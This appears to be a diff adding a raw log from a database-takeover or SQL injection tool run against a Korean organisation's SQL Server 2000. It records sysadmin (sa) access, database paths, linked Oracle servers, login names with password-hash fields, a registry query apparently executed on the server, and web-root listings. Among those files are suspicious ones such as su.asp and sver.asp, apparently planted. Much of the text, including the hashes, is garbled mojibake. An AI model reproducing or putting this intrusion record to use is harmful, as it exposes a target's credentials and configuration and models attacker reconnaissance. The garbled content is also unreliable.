@@ -1,0 +1,126 @@
+
+■数据库信息:============================================================
+- 数据库名：youngdong
+- 用户名：dbo
+- 版本：Microsoft SQL Server  2000 - 8.00.760 (Intel X86) 
+	Dec 17 2002 14:22:05 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.0 (Build 2195: Service Pack 4)
+
+- 服务器名：辑滚1
+- 服务名：MSSQLSERVER
+- 系统用户名：sa
+
+ ·当前用户权限：
+sysadmin(sa): 1
+dbcreator): 1
+bulkadmin: 1
+diskadmin: 1
+serveradmin: 1
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+BIC_COMMUNITY_CLUB	E:\Program Files\Microsoft SQL Server\MSSQL\data\BIC_COMMUNITY_CLUB_Data.MDF	
+Community	e:\Program Files\Microsoft SQL Server\MSSQL\data\Community_Data.MDF	
+master	e:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+model	e:\Program Files\Microsoft SQL Server\MSSQL\data\model.mdf	
+msdb	e:\Program Files\Microsoft SQL Server\MSSQL\data\msdbdata.mdf	
+Northwind	e:\Program Files\Microsoft SQL Server\MSSQL\data\northwnd.mdf	
+pubs	e:\Program Files\Microsoft SQL Server\MSSQL\data\pubs.mdf	
+tempdb	e:\Program Files\Microsoft SQL Server\MSSQL\data\tempdb.mdf	
+youngdong	e:\Program Files\Microsoft SQL Server\MSSQL\data\youngdong_Data.MDF	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+Microsoft(R) Windows (R) 2000 Operating System	sleeping	辑滚1	2628	AWAITING COMMAND		
+Microsoft(R) Windows (R) 2000 Operating System	sleeping	辑滚1	2628	AWAITING COMMAND		
+Microsoft(R) Windows (R) 2000 Operating System	runnable	辑滚1	2628	UPDATE		
+Microsoft(R) Windows (R) 2000 Operating System	runnable	辑滚1	2628	UPDATE		
+Microsoft(R) Windows (R) 2000 Operating System	sleeping	辑滚1	2628	AWAITING COMMAND		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+辑滚1	SQL Server	SQLOLEDB	辑滚1		辑滚1	
+SWD	ORACLE	MSDAORA	SWD			
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+		0		02 14 2003  3:20PM	02 14 2003  3:20PM	
+辑滚1\Administrator		1	茄惫绢	02 14 2003  3:20PM	02 14 2003  3:20PM	
+BUILTIN\Administrators		1	茄惫绢	02 14 2003  3:20PM	02 14 2003  3:20PM	
+club	?ほ?壍????竫????佶?稘?????	8	茄惫绢	02 18 2003 10:27AM	02 18 2003 10:32AM	
+community	????崶勜?們??????????搉??忈	9	茄惫绢	02 25 2003  9:16AM	02 25 2003  9:17AM	
+mustein	矽?硈芷?耕??????硈芷?耕??????	1	茄惫绢	02 14 2003  3:46PM	02 14 2003  3:46PM	
+sa	???笤?硾???矢?妓??穙ч????	1	茄惫绢	08  6 2000  1:27AM	02 14 2003  3:20PM	
+YTIS_SYSTEM	?????巸禡憦?	0		11 15 2006  7:31PM	11 15 2006  7:31PM	
+
+■reg query "HKLM\SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots" /V "/"
+1	'reg'篮(绰) 郴何 肚绰 寇何 疙飞, 角青且 荐 乐绰 橇肺弊伐, 肚绰	
+2	硅摹 颇老捞 酒凑聪促.	
+3		
+Dir of D:: 
+
+碍荤瘤盔\
+碍荤瘤盔0812\
+碍荤瘤盔0912\
+碍荤瘤盔荐沥090105\
+烙矫\
+Club\
+community\
+Component\
+cyber\
+gangsa\
+Gangsajiwon\
+HaksaSugang\
+Intranet\
+LOG\
+logbackup\
+RECYCLER\
+sql牢璃记汗备茄抛捞喉\
+System Volume Information\
+youngdong\
+
+Dir of D:\youngdong: 
+
+_notes\
+ADMIN\
+aspnet_client\
+board_pds\
+builder_home_back\
+builder_home\
+builder_img\
+dbconn\
+debug\
+include\
+js\
+made_professor_home\
+main_home\
+setup\
+stylesheet\
+temp\
+youngdong_board\
+d.asp
+default.ASP
+index.html
+screnc.exe
+sec.asp
+su.asp
+sver.asp
+YD_LOGIN_ok.ASP
+YD_LOGIN_ok.ASP.bak
+
